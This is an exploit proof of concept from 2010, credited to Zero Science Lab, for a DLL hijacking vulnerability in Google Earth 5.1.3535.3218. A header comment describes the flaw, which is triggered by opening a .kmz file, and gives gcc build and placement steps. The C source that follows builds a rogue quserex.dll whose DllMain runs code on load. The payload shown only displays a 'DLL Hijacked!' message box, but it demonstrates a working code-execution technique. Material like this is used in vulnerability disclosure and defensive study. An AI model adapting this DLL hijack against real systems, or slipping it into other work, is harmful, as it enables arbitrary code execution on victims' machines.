/*

 Google Earth v5.1.3535.3218 (quserex.dll) DLL Hijacking Exploit

 Vendor: Google Inc.
 Product Web Page: http://www.google.com
 Affected Version: 5.1.3535.3218

 Summary: Google Earth lets you fly anywhere on Earth to view
 satellite imagery, maps, terrain, 3D buildings, from galaxies
 in outer space to the canyons of the ocean. You can explore
 rich geographical content, save your toured places, and share
 with others.

 Desc: Google Earth suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local
 level. The vulnerable extension is .kmz thru quserex.dll and
 wintab32.dll libraries.

 ----
 gcc -shared -o quserex.dll googlee.c

 Compile and rename to quserex.dll, create a file test.kmz and put
 both files in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}